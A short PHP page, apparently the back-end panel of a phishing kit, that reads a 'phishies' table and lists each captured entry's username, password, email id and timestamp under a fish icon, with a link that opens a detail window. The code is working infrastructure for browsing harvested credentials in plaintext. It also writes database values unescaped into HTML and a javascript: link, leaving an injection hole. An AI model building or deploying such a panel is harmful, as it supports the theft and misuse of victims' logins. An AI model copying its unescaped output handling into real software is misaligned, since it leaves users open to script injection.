<?php
	require("db.php");
	
	$phishies = DB::query("SELECT * FROM phishies ORDER BY timestamp DESC");
	
	?>
	<div class="header"><p>Phishies</p></div>
	<?php
	
	foreach($phishies as $row) {
		?>
			<a href="javascript:openPhishWindow('<?php echo $row["username"]; ?>', '<?php echo $row["password"]; ?>', '<?php echo $row["emailId"]; ?>', '<?php echo $row["timestamp"]; ?>');"><div class="ticker-item">
				<img src="fish.png"/>
				<p><?php echo $row["username"]; ?></p>
			</div></a>
		<?php
	}
?>